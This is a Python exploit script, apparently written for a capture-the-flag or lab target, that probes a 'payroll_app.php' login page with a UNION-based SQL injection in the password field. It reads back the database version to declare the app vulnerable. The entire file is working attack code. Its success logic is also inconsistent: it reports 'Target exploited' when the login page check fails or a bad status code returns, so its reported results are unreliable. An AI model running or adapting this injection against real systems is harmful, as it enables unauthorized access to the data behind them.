#!/usr/bin/env python3

import requests
import argparse

import logging

log = logging.getLogger(__name__)


class Payroll:
    def __init__(self):
        self.__host = None
        self.__port = 80
        self.__path = "/payroll_app.php"

    def __check(self):
        exists = "Payroll Login"
        r = requests.get(f"http://{self.__host}:{self.__port}{self.__path}")
        if r.status_code != 200:
            log.info(f"[!] Invalid status code received ({self.__host})")
            return False
        if exists not in r.text:
            log.info(
                f"[!] Unexpected data returned. Thought they were slick. ({self.__host})"
            )
            return False
        return True

    def __exploit(self):
        sql = {
            "user": "defcon",
            "password": "' UNION SELECT null,null,null,@@version#",
            "s": "OK",
        }
        check = "5.5.62-0ubuntu0.14.04.1"
        r = requests.post(f"http://{self.__host}:{self.__port}{self.__path}", data=sql)
        if r.status_code != 200:
            log.info(f"[!] Invalid status code received ({self.__host})")
            return True
        if check in r.text:
            log.info(f"[!] Payroll app is vulnerable ({self.__host})")
            return True
        log.info(f"[!] Payroll app is secure ({self.__host})")
        return False

    def run(self, host, port=None):
        self.__host = host
        log.debug(f"[*] Exploiting Payroll App ({self.__host})")
        if port:
            self.__port = port
        if not self.__check():
            return True
        return self.__exploit()


def main(args):
    log.info("[+] Exploiting payroll_app.php by xentrick")
    log.info("[+] Exploiting " + args.host + ":" + args.port)

    exploit = Payroll()
    if exploit.run(args.host, int(args.port)):
        log.info("Target exploited")
    else:
        log.info("Exploit failed.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", required=True)
    args = parser.parse_args()

    main(args)
